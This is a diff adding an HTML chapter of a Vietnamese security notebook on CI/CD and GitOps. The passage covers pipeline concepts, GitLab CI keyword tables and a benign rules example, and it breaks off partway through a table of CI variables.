@@ -1,0 +1,1537 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chương 7 — CI/CD &amp;amp; GitOps — Sổ tay An toàn thông tin</title>
+<meta name="description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:title" content="Chương 7 — CI/CD &amp;amp; GitOps — Sổ tay An toàn thông tin">
+<meta property="og:description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:type" content="article">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📓</text></svg>">
+<link rel="prev" href="ch06.html"><link rel="next" href="ch08.html">
+<script>(function(){var t=localStorage.getItem('kb-theme');if(t&&t!=='light')document.documentElement.setAttribute('data-theme',t);})();</script>
+<style>:root{--wibu-bg:url("assets/wibu-bg.jpg")}</style>
+<style>
+:root{
+  --bg:#f4efe3; --panel:#ebe3d1; --panel2:#e1d7c0; --ink:#2b2620; --muted:#79705e;
+  --line:#d6cbb3; --accent:#0f6e60; --accent2:#b1502c; --code-bg:#241f18; --code-ink:#ece3d1;
+  --tbl-head:#e6dcc5; --tbl-zebra:#efe8d6; --kbd:#e6dcc5; --codeborder:#3a3228; --scroll:#cabda2;
+  --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+}
+html[data-theme="dark"]{
+  --bg:#16140f; --panel:#1e1b15; --panel2:#2a261d; --ink:#e9e2d2; --muted:#9c917c;
+  --line:#322d23; --accent:#46b3a3; --accent2:#e0824f; --code-bg:#0e0c08; --code-ink:#e9e2d2;
+  --tbl-head:#2a261d; --tbl-zebra:#1c1914; --kbd:#2c271e; --codeborder:#322d23; --scroll:#3a3328;
+}
+html[data-theme="wibu"]{
+  --bg:#241a38; --panel:rgba(38,28,55,.74); --panel2:rgba(60,44,86,.72); --ink:#f4ecff; --muted:#cbb9e6;
+  --line:rgba(255,255,255,.15); --accent:#ff79b0; --accent2:#a78bff; --code-bg:rgba(15,10,25,.85); --code-ink:#f0e8ff;
+  --tbl-head:rgba(60,44,86,.72); --tbl-zebra:rgba(48,35,70,.45); --kbd:rgba(70,52,98,.7); --codeborder:rgba(255,255,255,.13); --scroll:#7a5fae;
+}
+html[data-theme="wibu"] body{
+  background-color:#241a38;
+  background-image:var(--wibu-bg, none), linear-gradient(135deg,#2a1e44 0%,#46315f 55%,#5a3f74 100%);
+  background-size:cover; background-position:center; background-attachment:fixed;
+}
+html[data-theme="wibu"] .sidebar,
+html[data-theme="wibu"] .brand,
+html[data-theme="wibu"] .search,
+html[data-theme="wibu"] .topbar{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+html[data-theme="wibu"] .main{background:rgba(18,12,30,.55);border:1px solid var(--line);border-radius:16px;
+  margin-top:20px;margin-bottom:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:16px/1.72 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.wrap{display:flex;min-height:100vh}
+.sidebar{width:322px;flex:0 0 322px;background:var(--panel);border-right:1px solid var(--line);
+  height:100vh;position:sticky;top:0;overflow-y:auto;padding:0}
+.brand{padding:20px 18px 13px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel);z-index:2}
+.brand h1{font-family:var(--serif);font-size:19px;margin:0 0 3px;letter-spacing:.2px;color:var(--ink)}
+.brand .tag{margin:3px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.brand .author{display:block;margin-top:7px;font-size:11.5px;color:var(--accent2);font-weight:600}
+.controls{display:flex;gap:7px;margin-top:11px}
+.ctrl-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:var(--bg);
+  border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:5px 10px;font-size:12px;
+  cursor:pointer;font-family:inherit;line-height:1;text-decoration:none}
+.ctrl-btn:hover{border-color:var(--accent);text-decoration:none}
+.search{padding:10px 14px;position:sticky;top:118px;background:var(--panel);z-index:2;border-bottom:1px solid var(--line)}
+.search input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+  border-radius:7px;padding:8px 10px;font-size:13px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.nav{padding:8px 8px 40px}
+.nav-group{padding:16px 10px 5px;font-family:var(--serif);font-size:11px;font-weight:700;letter-spacing:.4px;
+  text-transform:uppercase;color:var(--accent2)}
+.nav-chapter{margin:1px 0}
+.nav-ch-title{display:flex;gap:9px;align-items:baseline;padding:7px 10px;border-radius:7px;color:var(--ink);font-size:13.5px}
+.nav-ch-title .num{font-family:var(--serif);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;min-width:18px}
+.nav-ch-title:hover{background:var(--panel2);text-decoration:none}
+.nav-chapter.active>.nav-ch-title{background:var(--bg);box-shadow:inset 3px 0 0 var(--accent);color:var(--ink);font-weight:700}
+.nav-chapter.active>.nav-ch-title .num{color:var(--accent)}
+.nav-subs{display:none;margin:2px 0 6px 27px;border-left:1px solid var(--line);padding-left:9px}
+.nav-chapter.open .nav-subs{display:block}
+.nav-sub{display:block;padding:4px 8px;font-size:12px;color:var(--muted);border-radius:6px;line-height:1.4}
+.nav-sub:hover{color:var(--accent);background:var(--panel2);text-decoration:none}
+
+.content{flex:1;min-width:0;padding:0 0 120px}
+.topbar{display:none}
+.main{max-width:820px;margin:0 auto;padding:40px 44px}
+.chapter{border-bottom:1px solid var(--line);padding-bottom:44px;margin-bottom:14px}
+.chapter h1{font-family:var(--serif);font-size:31px;line-height:1.22;margin:40px 0 20px;padding-bottom:12px;
+  border-bottom:2px solid var(--accent);color:var(--ink);scroll-margin-top:16px}
+.chapter:first-child h1{margin-top:8px}
+h2{font-family:var(--serif);font-size:23px;margin:36px 0 12px;color:var(--ink);scroll-margin-top:16px}
+h3{font-family:var(--serif);font-size:18px;margin:24px 0 8px;color:var(--ink);scroll-margin-top:16px}
+h4{font-size:14px;margin:18px 0 6px;color:var(--accent);font-weight:700}
+p{margin:11px 0}
+ul,ol{margin:11px 0;padding-left:24px}
+li{margin:5px 0}
+strong{color:var(--ink);font-weight:700}
+hr{border:0;border-top:1px solid var(--line);margin:28px 0}
+blockquote{margin:15px 0;padding:9px 16px;border-left:3px solid var(--accent2);
+  background:var(--panel);border-radius:0 7px 7px 0;color:var(--muted)}
+
+code{font-family:"SF Mono","JetBrains Mono",Consolas,"Liberation Mono",monospace;font-size:13px}
+:not(pre)>code{background:var(--kbd);color:var(--accent2);padding:1.5px 6px;border-radius:5px;font-size:12.5px}
+pre{background:var(--code-bg);border:1px solid var(--codeborder);border-radius:9px;padding:14px 16px;
+  overflow-x:auto;margin:15px 0;line-height:1.55}
+pre code{color:var(--code-ink);background:none;padding:0;font-size:12.7px;white-space:pre}
+
+.tbl-scroll,table{width:100%}
+table{border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--tbl-head);color:var(--ink);font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:var(--tbl-zebra)}
+
+.menu-btn{display:none}
+@media(max-width:980px){
+  .sidebar{position:fixed;left:0;top:0;z-index:50;transform:translateX(-100%);transition:transform .25s}
+  .sidebar.show{transform:none;box-shadow:0 0 40px rgba(20,15,8,.45)}
+  .topbar{display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:40;
+    background:var(--panel);border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu-btn{display:inline-flex;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+    border-radius:7px;padding:7px 12px;font-size:14px;cursor:pointer}
+  .topbar .ttl{font-family:var(--serif);font-size:15px;font-weight:700;flex:1}
+  .main{padding:24px 18px}
+  .chapter h1{font-size:25px}
+}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+
+.site-foot{max-width:820px;margin:54px auto 0;padding:24px 44px 0;border-top:1px solid var(--line);
+  color:var(--muted);font-size:13px;line-height:1.7}
+.site-foot a{color:var(--accent)}
+.site-foot .name{color:var(--ink);font-weight:700}
+@media(max-width:980px){.site-foot{padding:24px 18px 0}}
+.brand h1 a{color:var(--ink);text-decoration:none}
+.brand h1 a:hover{color:var(--accent)}
+.nav-sub.here{color:var(--accent);background:var(--panel2);font-weight:600}
+.pager{max-width:820px;margin:34px auto 0;display:flex;gap:14px;justify-content:space-between}
+.pg{flex:1 1 0;min-width:0;display:block;padding:13px 16px;border:1px solid var(--line);border-radius:10px;
+  background:var(--panel);color:var(--ink);text-decoration:none}
+a.pg:hover{border-color:var(--accent);text-decoration:none}
+a.pg:hover b{color:var(--accent)}
+.pg span{display:block;font-size:11.5px;color:var(--muted);margin-bottom:3px}
+.pg b{display:block;font-size:13.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg.next{text-align:right}
+span.pg{border:0;background:none}
+@media(max-width:980px){.pager{padding:0 18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><h1><a href="notes.html">Sổ tay An toàn thông tin</a></h1>
+      <p class="tag">Chia sẻ kiến thức · ghi chép khi học &amp; làm</p>
+      <span class="author">✍️ Fee</span>
+      <div class="controls"><a class="ctrl-btn" href="./">🏠 Trang chủ</a><button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div></div>
+    <div class="search"><input id="q" type="search" placeholder="Lọc mục lục…" autocomplete="off"></div>
+    <nav class="nav"><div class="nav-chapter" data-ch="00"><a class="nav-ch-title" href="notes.html"><span class="num">00</span><span class="t">Giới thiệu &amp; Mục lục</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần A · Nền tảng</div><div class="nav-chapter" data-ch="01"><a class="nav-ch-title" href="ch01.html"><span class="num">01</span><span class="t">Mạng máy tính</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="02"><a class="nav-ch-title" href="ch02.html"><span class="num">02</span><span class="t">Hệ điều hành Linux</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="03"><a class="nav-ch-title" href="ch03.html"><span class="num">03</span><span class="t">Windows &amp; Active Directory</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="04"><a class="nav-ch-title" href="ch04.html"><span class="num">04</span><span class="t">Mật mã &amp; Nền tảng bảo mật</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần B · An ninh ứng dụng &amp; DevSecOps</div><div class="nav-chapter" data-ch="05"><a class="nav-ch-title" href="ch05.html"><span class="num">05</span><span class="t">An ninh ứng dụng Web (OWASP)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="06"><a class="nav-ch-title" href="ch06.html"><span class="num">06</span><span class="t">DevSecOps &amp; Quét mã nguồn</span></a><div class="nav-subs"></div></div><div class="nav-chapter open active" data-ch="07"><a class="nav-ch-title" href="#top"><span class="num">07</span><span class="t">CI/CD &amp; GitOps</span></a><div class="nav-subs"><a class="nav-sub" href="#ch07-tong-quan">Tổng quan</a><a class="nav-sub" href="#ch07-moi-muc-đi-theo-mach-la-gi-co-che-ben-trong-vi-du-thuc-te-luu-y-bao-mat-con-so-phien-ban-va-hanh-vi-cong-cu-đoi-theo-thoi-gian-cho-nao-can-kiem-chung-lai-đeu-co-ghi-chu">&amp;gt; Mỗi mục đi theo mạch: là gì → cơ chế bên trong → ví dụ thực tế → lưu ý bảo mật. Con số phiên bản và hành vi công cụ đổi theo thời gian, chỗ nào cần kiểm chứng lại đều có ghi chú.</a><a class="nav-sub" href="#ch07-71-khai-niem-cicd-pipeline-as-code-va-mo-hinh-du-lieu-nen-tang">7.1. Khái niệm CI/CD, pipeline as code và mô hình dữ liệu nền tảng</a><a class="nav-sub" href="#ch07-72-gitlab-ci-chi-tiet">7.2. GitLab CI — chi tiết</a><a class="nav-sub" href="#ch07-73-github-actions">7.3. GitHub Actions</a><a class="nav-sub" href="#ch07-74-jenkins">7.4. Jenkins</a><a class="nav-sub" href="#ch07-75-argo-cd-gitops">7.5. Argo CD &amp;amp; GitOps</a><a class="nav-sub" href="#ch07-76-git-submodule-chia-se-template-chung">7.6. Git Submodule (chia sẻ template chung)</a><a class="nav-sub" href="#ch07-77-so-sanh-va-khi-nao-dung-cong-cu-nao">7.7. So sánh và khi nào dùng công cụ nào</a><a class="nav-sub" href="#ch07-78-bao-ve-pipeline-nhu-mot-he-thong-production-tieu-chuan-bao-mat-cho-pr">7.8. Bảo vệ pipeline như một hệ thống production &amp;amp; tiêu chuẩn bảo mật cho PR</a><a class="nav-sub" href="#ch07-ghi-chu-cua-minh">Ghi chú của mình</a></div></div><div class="nav-group">Phần C · Giám sát, Phát hiện &amp; Ứng phó</div><div class="nav-chapter" data-ch="08"><a class="nav-ch-title" href="ch08.html"><span class="num">08</span><span class="t">SIEM &amp; Quản lý log</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="09"><a class="nav-ch-title" href="ch09.html"><span class="num">09</span><span class="t">Observability &amp; Giám sát hạ tầng</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="10"><a class="nav-ch-title" href="ch10.html"><span class="num">10</span><span class="t">Vận hành SOC &amp; Ứng phó sự cố</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần D · Phòng thủ mạng &amp; Kiểm thử</div><div class="nav-chapter" data-ch="11"><a class="nav-ch-title" href="ch11.html"><span class="num">11</span><span class="t">Phòng thủ mạng (IDS/WAF/VPN)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="12"><a class="nav-ch-title" href="ch12.html"><span class="num">12</span><span class="t">Kiểm thử &amp; Đánh giá lỗ hổng</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần E · Hạ tầng, Ảo hóa &amp; Đám mây</div><div class="nav-chapter" data-ch="13"><a class="nav-ch-title" href="ch13.html"><span class="num">13</span><span class="t">Bảo mật Đám mây</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="14"><a class="nav-ch-title" href="ch14.html"><span class="num">14</span><span class="t">Ảo hóa &amp; Container</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần F · Tấn công, Tuân thủ &amp; Tự động hóa</div><div class="nav-chapter" data-ch="15"><a class="nav-ch-title" href="ch15.html"><span class="num">15</span><span class="t">Threat Intel &amp; Khung tấn công</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="16"><a class="nav-ch-title" href="ch16.html"><span class="num">16</span><span class="t">Tuân thủ &amp; Quản trị (GRC)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="17"><a class="nav-ch-title" href="ch17.html"><span class="num">17</span><span class="t">Lập trình &amp; Tự động hóa</span></a><div class="nav-subs"></div></div><div class="nav-group">Phụ lục</div><div class="nav-chapter" data-ch="99"><a class="nav-ch-title" href="ch99.html"><span class="num">99</span><span class="t">Thuật ngữ &amp; viết tắt</span></a><div class="nav-subs"></div></div></nav>
+  </aside>
+  <div class="content">
+    <div class="topbar"><button class="menu-btn" id="menu">☰</button><span class="ttl">Sổ tay An toàn thông tin</span>
+      <button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div>
+    <main class="main" id="top">
+      <section class="chapter" id="sec-07" data-ch="07">
+<h1 id="ch07-chuong-7-cicd-gitops">Chương 7 — CI/CD &amp; GitOps</h1>
+<h2 id="ch07-tong-quan">Tổng quan</h2>
+<p>Pipeline là thứ ít người coi là "hệ thống production", nhưng nó giữ secret của toàn bộ hạ tầng và chạy với đặc quyền cao — chiếm được pipeline gần như tương đương chiếm được mọi thứ nó chạm tới. Chương này đi qua chuỗi tự động đưa code từ commit của lập trình viên tới lúc chạy thật, và cách giữ cho chính chuỗi đó không trở thành đường tấn công.</p>
+<p>Mở đầu là các khái niệm nền: <strong>CI</strong> ghép và kiểm tra mọi commit để bắt regression sớm, <strong>CD</strong> đưa artifact đã qua kiểm tra ra môi trường đích (<em>Delivery</em> có cổng phê duyệt thủ công trước production, <em>Deployment</em> thì không), và <strong>Pipeline as Code</strong> đưa toàn bộ định nghĩa pipeline vào repo dưới dạng file — nhờ đó cấu hình nhạy cảm được review và truy vết như mọi thay đổi code khác, thay vì là thiết lập ẩn ai đó click trên giao diện.</p>
+<p>Ba engine được mổ xẻ kèm điểm yếu đặc trưng của từng cái: <strong>GitLab CI</strong> (<code>.gitlab-ci.yml</code>, runner/executor — rủi ro nằm ở masked/protected variable và lựa chọn executor), <strong>GitHub Actions</strong> (workflow/job/step, hỗ trợ OIDC — nhưng action bên thứ ba là bề mặt chuỗi cung ứng, và nhầm <code>pull_request</code> với <code>pull_request_target</code> là kiểu rò secret phổ biến nhất), và <strong>Jenkins</strong> (controller/agent, <code>Jenkinsfile</code> — linh hoạt và chạy được on-prem, đổi lại hàng nghìn plugin là bề mặt tấn công). Tiếp đó là <strong>GitOps</strong> với <strong>Argo CD</strong>, nơi mô hình đảo chiều: thay vì CI cầm credential đẩy vào cluster, agent trong cluster tự kéo trạng thái từ Git — credential không rời cluster, và self-heal khôi phục cả những thay đổi trái phép làm tay. <strong>Git submodule</strong> xuất hiện như cách chia sẻ template CI/CD giữa nhiều project với commit SHA được pin cứng.</p>
+<p>Mục cuối (7.8) quay lại chính chủ đề mở đầu: bảo vệ pipeline. Secret ở vault chứ không in ra log, ký và verify artifact, khóa quyền sửa pipeline — cộng với hai công cụ mà tự động hóa không thay thế được: PR security checklist và Definition of Done có phần bảo mật, vì lỗi logic nghiệp vụ thì chỉ người review mới bắt được.</p>
+<h2 id="ch07-moi-muc-đi-theo-mach-la-gi-co-che-ben-trong-vi-du-thuc-te-luu-y-bao-mat-con-so-phien-ban-va-hanh-vi-cong-cu-đoi-theo-thoi-gian-cho-nao-can-kiem-chung-lai-đeu-co-ghi-chu">&gt; Mỗi mục đi theo mạch: là gì → cơ chế bên trong → ví dụ thực tế → lưu ý bảo mật. Con số phiên bản và hành vi công cụ đổi theo thời gian, chỗ nào cần kiểm chứng lại đều có ghi chú.</h2>
+<h2 id="ch07-71-khai-niem-cicd-pipeline-as-code-va-mo-hinh-du-lieu-nen-tang">7.1. Khái niệm CI/CD, pipeline as code và mô hình dữ liệu nền tảng</h2>
+<h3 id="ch07-711-ci-cd-delivery-va-cd-deployment-đinh-nghia-chinh-xac">7.1.1. CI, CD (Delivery) và CD (Deployment) — định nghĩa chính xác</h3>
+<ul>
+<li><strong>CI (Continuous Integration):</strong> mỗi commit/merge request được tự động build và test. Mục tiêu kỹ thuật: phát hiện xung đột tích hợp và regression ở mức commit, giữ nhánh chính (<code>main</code>/<code>master</code>) luôn ở trạng thái "green" (build + test pass).</li>
+<li><strong>CD — Continuous Delivery:</strong> mọi artifact đã qua CI luôn ở trạng thái <strong>sẵn sàng release</strong>, nhưng bước đưa lên production cần một <strong>gate thủ công</strong> (manual approval).</li>
+<li><strong>CD — Continuous Deployment:</strong> không có gate thủ công; mọi commit pass test sẽ tự động lên production.</li>
+</ul>
+<p>Sự khác biệt Delivery vs Deployment <strong>chỉ nằm ở một cổng phê duyệt</strong>. Về mặt bảo mật, cổng đó là điểm kiểm soát thay đổi (change control) — nơi gắn các bằng chứng tuân thủ (SoD — Separation of Duties).</p>
+<h3 id="ch07-712-cac-stage-đien-hinh-cua-pipeline">7.1.2. Các stage điển hình của pipeline</h3>
+<p>Luồng đi: <code>source → build → test → sast/sca → package → publish → deploy(staging) → integration test → deploy(prod) → verify</code>. Ý nghĩa từng stage:</p>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Mô tả</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>source</code></td>
+<td>Nhận commit hoặc MR</td>
+</tr>
+<tr>
+<td><code>build</code></td>
+<td>Biên dịch mã nguồn</td>
+</tr>
+<tr>
+<td><code>test</code></td>
+<td>Chạy unit test / integration test</td>
+</tr>
+<tr>
+<td><code>sast/sca</code></td>
+<td>Quét mã (SAST) và dependency (SCA)</td>
+</tr>
+<tr>
+<td><code>package</code></td>
+<td>Đóng gói artifact (image/jar)</td>
+</tr>
+<tr>
+<td><code>publish</code></td>
+<td>Đẩy artifact lên registry</td>
+</tr>
+<tr>
+<td><code>deploy(staging)</code></td>
+<td>Triển khai lên môi trường trung gian</td>
+</tr>
+<tr>
+<td><code>integration test</code></td>
+<td>Kiểm thử end-to-end</td>
+</tr>
+<tr>
+<td><code>deploy(prod)</code></td>
+<td>Triển khai lên production</td>
+</tr>
+<tr>
+<td><code>verify</code></td>
+<td>Smoke test sau triển khai</td>
+</tr>
+</tbody>
+</table>
+<p>Mỗi stage là một <strong>ranh giới tin cậy (trust boundary)</strong>: artifact đi qua stage được "thăng cấp" độ tin cậy. Tấn công chuỗi cung ứng (supply chain) nhắm vào việc chèn payload <strong>trước</strong> một stage để được thăng cấp tin cậy mà không qua kiểm soát.</p>
+<h3 id="ch07-713-pipeline-as-code-vi-sao">7.1.3. Pipeline as Code — vì sao?</h3>
+<p>Thay vì cấu hình pipeline qua UI (click-ops), toàn bộ định nghĩa pipeline nằm trong file YAML/Groovy <strong>đặt trong chính repository</strong>. Lý do thiết kế:</p>
+<table>
+<thead>
+<tr>
+<th>Thuộc tính</th>
+<th>Vì sao quan trọng (góc nhìn bảo mật/vận hành)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Versioned</td>
+<td>Pipeline thay đổi → diff được, audit được qua git log</td>
+</tr>
+<tr>
+<td>Review được</td>
+<td>Thay đổi pipeline đi qua code review/MR như mọi code khác</td>
+</tr>
+<tr>
+<td>Reproducible</td>
+<td>Cùng commit → cùng pipeline; không có "config drift" ẩn trong UI</td>
+</tr>
+<tr>
+<td>Co-located</td>
+<td>Pipeline đi cùng code → branch khác nhau có pipeline khác nhau</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Lưu ý:</strong> vì pipeline-as-code nằm trong repo và thường chạy với quyền cao (truy cập secrets, registry, cluster), bất kỳ ai sửa được file pipeline (qua MR/PR, hoặc commit trực tiếp vào nhánh không bảo vệ) đều có khả năng <strong>thực thi mã tùy ý trong môi trường CI</strong>. Đây là lớp tấn công chính trong toàn chương.</p>
+<hr />
+<h2 id="ch07-72-gitlab-ci-chi-tiet">7.2. GitLab CI — chi tiết</h2>
+<h3 id="ch07-721-mo-hinh-thuc-thi-va-file-gitlab-ciyml">7.2.1. Mô hình thực thi và file <code>.gitlab-ci.yml</code></h3>
+<p>GitLab CI đọc file <code>.gitlab-ci.yml</code> ở <strong>gốc repository</strong> (đường dẫn có thể cấu hình lại trong Settings → CI/CD). File này là YAML định nghĩa các <strong>job</strong>. Job được nhóm vào <strong>stage</strong>; các job cùng stage chạy <strong>song song</strong>, các stage chạy <strong>tuần tự</strong>. Một job chỉ chạy khi mọi job ở stage trước thành công (trừ khi dùng <code>needs</code> để tạo DAG).</p>
+<h4 id="ch07-cau-truc-đay-đu-bang-tung-khoa-cap-cao-nhat-global-keywords">Cấu trúc đầy đủ — bảng từng khóa cấp cao nhất (global keywords)</h4>
+<table>
+<thead>
+<tr>
+<th>Khóa</th>
+<th>Kiểu</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>stages</code></td>
+<td>list</td>
+<td>Thứ tự các stage</td>
+<td><code>[build, test, deploy]</code></td>
+</tr>
+<tr>
+<td><code>variables</code></td>
+<td>map</td>
+<td>Biến môi trường toàn cục</td>
+<td><code>DOCKER_DRIVER: overlay2</code></td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td>map</td>
+<td>Cấu hình mặc định cho mọi job (image, before_script...)</td>
+<td><code>image: alpine:3.20</code></td>
+</tr>
+<tr>
+<td><code>workflow</code></td>
+<td>map</td>
+<td>Quy tắc tạo/không tạo pipeline</td>
+<td><code>rules:</code></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>list/map</td>
+<td>Nhập file CI khác (local/remote/template/project)</td>
+<td><code>- local: ci/sast.yml</code></td>
+</tr>
+<tr>
+<td><code>cache</code></td>
+<td>map</td>
+<td>Cache toàn cục</td>
+<td><code>paths: [node_modules]</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="ch07-cac-khoa-cap-job-bang-chi-tiet">Các khóa cấp job — bảng chi tiết</h4>
+<table>
+<thead>
+<tr>
+<th>Khóa</th>
+<th>Ý nghĩa</th>
+<th>Ghi chú kỹ thuật</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>stage</code></td>
+<td>Stage chứa job</td>
+<td>Mặc định <code>test</code> nếu không khai báo</td>
+</tr>
+<tr>
+<td><code>script</code></td>
+<td>Lệnh shell chính (bắt buộc)</td>
+<td>list of strings; mỗi phần tử là một lệnh</td>
+</tr>
+<tr>
+<td><code>before_script</code></td>
+<td>Lệnh chạy trước <code>script</code></td>
+<td>Gộp chung shell với <code>script</code> (cùng process tree)</td>
+</tr>
+<tr>
+<td><code>after_script</code></td>
+<td>Lệnh chạy sau, <strong>kể cả khi job fail</strong></td>
+<td>Chạy trong shell <strong>tách biệt</strong> — biến từ <code>script</code> không còn</td>
+</tr>
+<tr>
+<td><code>rules</code></td>
+<td>Điều kiện chạy/biến/khi nào allow_failure</td>
+<td>Thay thế hiện đại cho <code>only/except</code></td>
+</tr>
+<tr>
+<td><code>only</code> / <code>except</code></td>
+<td>Điều kiện chạy (cũ)</td>
+<td>Vẫn dùng được nhưng không trộn với <code>rules</code> trong cùng job</td>
+</tr>
+<tr>
+<td><code>artifacts</code></td>
+<td>File/đường dẫn lưu lại sau job</td>
+<td>Truyền giữa stage; có <code>expire_in</code>, <code>reports</code></td>
+</tr>
+<tr>
+<td><code>cache</code></td>
+<td>Thư mục cache giữa các lần chạy</td>
+<td>Khác artifacts: cache tăng tốc, không đảm bảo tồn tại</td>
+</tr>
+<tr>
+<td><code>needs</code></td>
+<td>Tạo DAG, chạy job không chờ hết stage trước</td>
+<td>Giới hạn số phần tử tùy version</td>
+</tr>
+<tr>
+<td><code>services</code></td>
+<td>Container phụ chạy cùng job (DB, docker:dind)</td>
+<td>Network chung với job</td>
+</tr>
+<tr>
+<td><code>tags</code></td>
+<td>Chọn runner theo tag</td>
+<td>Khớp với tag đăng ký của runner</td>
+</tr>
+<tr>
+<td><code>environment</code></td>
+<td>Gắn job với environment (deploy)</td>
+<td>Hiện trên UI, hỗ trợ rollback</td>
+</tr>
+<tr>
+<td><code>when</code></td>
+<td><code>on_success</code>/<code>on_failure</code>/<code>always</code>/<code>manual</code>/<code>delayed</code></td>
+<td><code>manual</code> tạo job bấm tay</td>
+</tr>
+<tr>
+<td><code>allow_failure</code></td>
+<td>Job fail không làm fail pipeline</td>
+<td>Mặc định true cho <code>when: manual</code></td>
+</tr>
+<tr>
+<td><code>retry</code></td>
+<td>Số lần thử lại</td>
+<td>Có thể lọc theo loại lỗi</td>
+</tr>
+<tr>
+<td><code>timeout</code></td>
+<td>Giới hạn thời gian job</td>
+<td>Ghi đè timeout project</td>
+</tr>
+<tr>
+<td><code>dependencies</code></td>
+<td>Chọn artifacts của job nào để tải về</td>
+<td>Rỗng <code>[]</code> = không tải artifact nào</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch07-722-rules-co-che-đanh-gia-tung-buoc">7.2.2. <code>rules</code> — cơ chế đánh giá từng bước</h3>
+<p><code>rules</code> là <strong>danh sách có thứ tự</strong>. GitLab duyệt từ trên xuống, <strong>dừng ở rule đầu tiên khớp</strong>, rồi áp dụng <code>when</code>/<code>variables</code>/<code>allow_failure</code> của rule đó. Nếu không rule nào khớp → job <strong>không được thêm</strong> vào pipeline.</p>
+<p>Mỗi rule có thể dùng:
+- <code>if:</code> — biểu thức trên biến CI (so sánh <code>==</code>, <code>!=</code>, <code>=~</code> regex, <code>&amp;&amp;</code>, <code>||</code>).
+- <code>changes:</code> — danh sách glob path; khớp nếu commit thay đổi các file đó.
+- <code>exists:</code> — file tồn tại trong repo.</p>
+<pre><code class="language-yaml">test-job:
+  stage: test
+  script: [&quot;pytest -q&quot;]
+  rules:
+    # Rule 1: MR nhắm vào main → chạy, không cho phép fail
+    - if: '$CI_PIPELINE_SOURCE == &quot;merge_request_event&quot; &amp;&amp; $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == &quot;main&quot;'
+      when: on_success
+      allow_failure: false
+    # Rule 2: chỉ chạy khi đổi file Python
+    - if: '$CI_COMMIT_BRANCH'
+      changes: [&quot;**/*.py&quot;]
+    # Rule 3: ngược lại không thêm job (ngầm định khi hết list)
+</code></pre>
+<p><strong>Vì sao thiết kế "dừng ở match đầu tiên":</strong> giống một bộ lọc ACL — thứ tự quan trọng, rule cụ thể đặt trên, rule tổng quát đặt dưới.</p>
+<h3 id="ch07-723-bien-cicd-predefined-quan-trong">7.2.3. Biến CI/CD predefined quan trọng</h3>
+<table>
+<thead>
+<tr>
+<th>Biến</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ giá trị</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CI_PIPELINE_SOURCE</code></td>
+<td>Nguồn kích hoạt</td>
